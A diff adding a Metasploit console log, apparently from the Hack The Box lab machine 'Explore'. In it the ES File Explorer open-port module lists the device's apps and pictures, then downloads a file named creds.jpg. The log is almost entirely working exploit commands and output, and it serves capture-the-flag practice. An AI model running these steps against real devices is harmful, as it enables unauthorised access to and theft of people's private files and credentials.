@@ -1,0 +1,144 @@
+kali@kali:~$ msfconsole
+                                                  
+     ,           ,
+    /             \
+   ((__---,,,---__))
+      (_) O O (_)_________
+         \ _ /            |\
+          o_o \   M S F   | \
+               \   _____  |  *
+                |||   WW|||
+                |||     |||
+
+
+       =[ metasploit v6.0.53-dev                          ]
++ -- --=[ 2149 exploits - 1143 auxiliary - 366 post       ]
++ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
++ -- --=[ 8 evasion                                       ]
+
+Metasploit tip: View missing module options with show 
+missing
+
+msf6 > search es file explorer
+
+Matching Modules
+================
+
+   #   Name                                                      Disclosure Date  Rank       Check  Description
+   -   ----                                                      ---------------  ----       -----  -----------
+   0   auxiliary/scanner/http/es_file_explorer_open_port         2019-01-16       normal     No     ES File Explorer Open Port
+   1   auxiliary/gather/ie_sandbox_findfiles                     2016-08-09       normal     No     Internet Explorer Iframe Sandbox File Name Disclosure Vulnerability
+   2   exploit/multi/browser/java_jre17_driver_manager           2013-01-10       excellent  No     Java Applet Driver Manager Privileged toString() Remote Code Execution
+   3   post/linux/gather/gnome_commander_creds                                    normal     No     Linux Gather Gnome-Commander Creds
+   4   exploit/windows/browser/ms10_002_aurora                   2010-01-14       normal     No     MS10-002 Microsoft Internet Explorer "Aurora" Memory Corruption
+   5   exploit/windows/browser/ms10_018_ie_behaviors             2010-03-09       good       No     MS10-018 Microsoft Internet Explorer DHTML Behaviors Use After Free
+   6   exploit/windows/browser/ms10_022_ie_vbscript_winhlp32     2010-02-26       great      No     MS10-022 Microsoft Internet Explorer Winhlp32.exe MsgBox Code Execution
+   7   exploit/windows/browser/ms11_093_ole32                    2011-12-13       normal     No     MS11-093 Microsoft Windows OLE Object File Handling Remote Code Execution
+   8   exploit/windows/browser/ms13_009_ie_slayoutrun_uaf        2013-02-13       average    No     MS13-009 Microsoft Internet Explorer SLayoutRun Use-After-Free
+   9   auxiliary/gather/ms14_052_xmldom                          2014-09-09       normal     No     MS14-052 Microsoft Internet Explorer XMLDOM Filename Disclosure
+   10  auxiliary/gather/ie_uxss_injection                        2015-02-01       normal     No     MS15-018 Microsoft Internet Explorer 10 and 11 Cross-Domain JavaScript Injection
+   11  auxiliary/server/ms15_134_mcl_leak                        2015-12-08       normal     No     MS15-134 Microsoft Windows Media Center MCL Information Disclosure
+   12  exploit/multi/http/manageengine_auth_upload               2014-12-15       excellent  Yes    ManageEngine Multiple Products Authenticated File Upload
+   13  exploit/windows/fileformat/mcafee_showreport_exec         2012-01-12       normal     No     McAfee SaaS MyCioScan ShowReport Remote Command Execution
+   14  exploit/windows/browser/ie_unsafe_scripting               2010-09-20       manual     No     Microsoft Internet Explorer Unsafe Scripting Misconfiguration
+   15  exploit/windows/browser/vlc_amv                           2011-03-23       good       No     VLC AMV Dangling Pointer Vulnerability
+   16  exploit/windows/browser/imgeviewer_tifmergemultifiles     2010-03-03       normal     No     Viscom Image Viewer CP Pro 8.0/Gold 6.0 ActiveX Control
+   17  exploit/windows/browser/ms07_017_ani_loadimage_chunksize  2007-03-28       great      No     Windows ANI LoadAniIcon() Chunk Size Stack Buffer Overflow (HTTP)
+   18  post/windows/manage/ie_proxypac                                            normal     No     Windows Manage Proxy PAC File
+
+
+Interact with a module by name or index. For example info 18, use 18 or use post/windows/manage/ie_proxypac
+
+msf6 > use 0
+msf6 auxiliary(scanner/http/es_file_explorer_open_port) > show options
+
+Module options (auxiliary/scanner/http/es_file_explorer_open_port):
+
+   Name        Current Setting  Required  Description
+   ----        ---------------  --------  -----------
+   ACTIONITEM                   no        If an app or filename if required by the action
+   Proxies                      no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                       yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT       59777            yes       The target port (TCP)
+   SSL         false            no        Negotiate SSL/TLS for outgoing connections
+   THREADS     1                yes       The number of concurrent threads (max one per host)
+   VHOST                        no        HTTP server virtual host
+
+
+Auxiliary action:
+
+   Name           Description
+   ----           -----------
+   GETDEVICEINFO  Get device info
+
+
+msf6 auxiliary(scanner/http/es_file_explorer_open_port) > set RHOSTS explore.htb
+RHOSTS => explore.htb
+msf6 auxiliary(scanner/http/es_file_explorer_open_port) > run
+
+[+] 10.10.10.247:59777   - Name: VMware Virtual Platform
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf6 auxiliary(scanner/http/es_file_explorer_open_port) > show actions
+
+Auxiliary actions:
+
+   Name            Description
+   ----            -----------
+   APPLAUNCH       Launch an app. ACTIONITEM required.
+   GETDEVICEINFO   Get device info
+   GETFILE         Get a file from the device. ACTIONITEM required.
+   LISTAPPS        List all the apps installed
+   LISTAPPSALL     List all the apps installed
+   LISTAPPSPHONE   List all the phone apps installed
+   LISTAPPSSDCARD  List all the apk files stored on the sdcard
+   LISTAPPSSYSTEM  List all the system apps installed
+   LISTAUDIOS      List all the audio files
+   LISTFILES       List all the files on the sdcard
+   LISTPICS        List all the pictures
+   LISTVIDEOS      List all the videos
+
+
+msf6 auxiliary(scanner/http/es_file_explorer_open_port) > set action LISTAPPS
+action => LISTAPPS
+msf6 auxiliary(scanner/http/es_file_explorer_open_port) > run
+
+[+] 10.10.10.247:59777   
+  Google Play Store (com.android.vending) Version: 22.4.25-21 [0] [PR] 337959405
+  Gmail (com.google.android.gm) Version: 2020.05.31.316831277.release
+  ES File Explorer (com.estrongs.android.pop) Version: 4.1.9.7.3
+  Google Play services (com.google.android.gms) Version: 21.02.14 (100800-352619232)
+  SSH Server (net.xnano.android.sshserver) Version: 0.9.1
+
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf6 auxiliary(scanner/http/es_file_explorer_open_port) > 
+
+msf6 auxiliary(scanner/http/es_file_explorer_open_port) > set action LISTPICS
+action => LISTPICS
+msf6 auxiliary(scanner/http/es_file_explorer_open_port) > run
+
+[+] 10.10.10.247:59777   
+  concept.jpg (135.33 KB) - 4/21/21 02:38:08 AM: /storage/emulated/0/DCIM/concept.jpg
+  anc.png (6.24 KB) - 4/21/21 02:37:50 AM: /storage/emulated/0/DCIM/anc.png
+  creds.jpg (1.14 MB) - 4/21/21 02:38:18 AM: /storage/emulated/0/DCIM/creds.jpg
+  224_anc.png (124.88 KB) - 4/21/21 02:37:21 AM: /storage/emulated/0/DCIM/224_anc.png
+
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf6 auxiliary(scanner/http/es_file_explorer_open_port) > 
+
+
+
+//////////////////////////////////// NOW WE WANT TO GET PICS ////////////////////////////////////
+
+msf6 auxiliary(scanner/http/es_file_explorer_open_port) > set action GETFILE
+action => GETFILE
+msf6 auxiliary(scanner/http/es_file_explorer_open_port) > set ACTIONITEM /storage/emulated/0/DCIM/creds.jpg
+ACTIONITEM => /storage/emulated/0/DCIM/creds.jpg
+msf6 auxiliary(scanner/http/es_file_explorer_open_port) > run
+
+[+] 10.10.10.247:59777   - /storage/emulated/0/DCIM/creds.jpg saved to /home/kali/.msf4/loot/20210720130758_default_10.10.10.247_getFile_222983.jpg
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
